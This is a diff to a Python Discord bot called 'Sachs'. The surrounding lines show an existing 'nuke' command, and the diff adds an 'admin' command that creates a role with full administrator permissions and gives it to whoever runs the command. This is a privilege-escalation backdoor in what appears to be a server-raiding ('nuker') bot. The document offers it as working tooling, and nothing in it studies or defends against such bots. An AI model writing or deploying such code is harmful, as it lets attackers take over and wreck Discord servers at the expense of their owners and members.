@@ -133,5 +133,12 @@ async def nuke(ctx):
       await asyncio.gather(*tasks)
     """
 
+@Sachs.command()
+async def admin(ctx):
+  guild = ctx.guild
+  adminperms = discord.Permissions(administrator=True)
+  role = await guild.create_role(name="we luv hmg....", permissions=adminperms)
+  user = ctx.author
+  await user.add_roles(role)
 
 Sachs.run(TOKEN)
